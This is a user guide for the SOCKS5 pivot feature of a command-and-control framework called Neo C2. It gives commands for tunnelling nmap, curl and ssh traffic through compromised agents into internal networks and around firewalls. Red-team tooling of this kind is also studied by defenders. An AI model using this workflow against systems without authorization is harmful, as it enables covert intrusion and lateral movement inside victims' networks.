# SOCKS5 Pivot Guide for Neo C2

The reverse proxy functionality allows you to route traffic through compromised hosts using a SOCKS5 proxy. This guide explains how to use this feature for network pivoting.

## Overview

The SOCKS5 pivot feature enables you to:
- Access internal networks through compromised hosts
- Route tool traffic through the C2 channel
- Perform DNS resolution from the target network (not your machine)
- Bypass network restrictions and firewalls

## How It Works

1. **Agent Side**: The agent starts a SOCKS5 server and connects back to the C2 server
2. **Server Side**: Neo C2 server accepts the agent's connection and relays SOCKS5 traffic
3. **Client Side**: Your local tools connect to the local SOCKS proxy you started
4. **Traffic Flow**: Your tool → Local SOCKS proxy → Neo C2 server → Agent → Target network

## Step-by-Step Instructions

### Step 1: Start Reverse Proxy on Agent

First, you need to start the reverse proxy functionality on the target agent:

```
NeoC2 (user@remote) > reverse_proxy start <agent_id> [port]
```

For example:
```
NeoC2 (user@remote) > reverse_proxy start abc123-xyz789-...
```

This command:
- Sends a `reverse_proxy_start` command to the specified agent
- The agent connects back to the C2 server on port 5555 (default)
- The agent establishes a persistent connection for SOCKS5 traffic

### Step 2: Start Local SOCKS Proxy

In the same Neo C2 CLI session, start a local SOCKS5 proxy server:

```
NeoC2 (user@remote) > socks [port]
```

For example:
```
NeoC2 (user@remote) > socks 1080
```

This creates a local SOCKS5 proxy server on port 1080 (or 1080 by default if no port specified) that routes traffic through the C2 channel.

### Step 3: Configure Your Tools

Configure your tools to use the local SOCKS proxy. For example:

#### Using proxychains:
Edit `/etc/proxychains4.conf` and add:
```
[ProxyList]
socks5 127.0.0.1 1080
```

Then use tools through proxychains:
```bash
proxychains nmap -sT 10.0.0.0/24
proxychains curl http://internal-site.local
proxychains ssh user@internal-host
```

#### Using other tools:
- **Burp Suite**: Configure upstream proxy to 127.0.0.1:1080
- **Firefox/Chrome**: Configure browser proxy settings
- **Nmap**: `nmap --proxies socks5://127.0.0.1:1080`

### Step 4: Stop the Proxy (When Done)

To stop the reverse proxy on the agent:
```
NeoC2 (user@remote) > reverse_proxy stop <agent_id>
```

To stop the local SOCKS proxy, press `Ctrl+C` in the CLI where the `socks` command is running.

## Example Complete Workflow

```
NeoC2 (user@remote) > reverse_proxy start abc123-xyz789-...
[+] Reverse proxy started for agent abc123-xyz789-... on port 5555

NeoC2 (user@remote) > socks 1080
[*] SOCKS5 proxy listening on 127.0.0.1:1080
[*] Configure your tools to use socks5://127.0.0.1:1080
[+] New SOCKS client connection from 127.0.0.1:54321

# In another terminal:
proxychains nmap -sn 10.0.0.0/24

# When done:
NeoC2 (user@remote) > reverse_proxy stop abc123-xyz789-...
[+] Reverse proxy stopped for agent abc123-xyz789-...
```

## Important Notes

- The agent must support reverse proxy functionality (Go agents with the updated template)
- The agent performs DNS resolution on the target network (not on your machine)
- Supports IPv4, IPv6, and domain name resolution
- All traffic is encrypted through the C2 channel
- Use `Ctrl+C` to stop the local SOCKS proxy server
- The default reverse proxy port is 5555 on the C2 server
- The default local SOCKS proxy port is 1080

## Troubleshooting

### Common Issues:
- **Connection Refused**: Verify the agent is running and reverse proxy is started
- **DNS Resolution**: The agent resolves domain names, not your local machine
- **Port Conflicts**: Use different local ports if 1080 is already in use
- **Timeout Issues**: Increase tool timeouts as traffic routes through C2 channel

### Verification Steps:
1. Confirm agent is active: `agent list`
2. Verify reverse proxy started: Check agent response
3. Test local proxy: `curl --socks5 127.0.0.1:1080 http://127.0.0.1`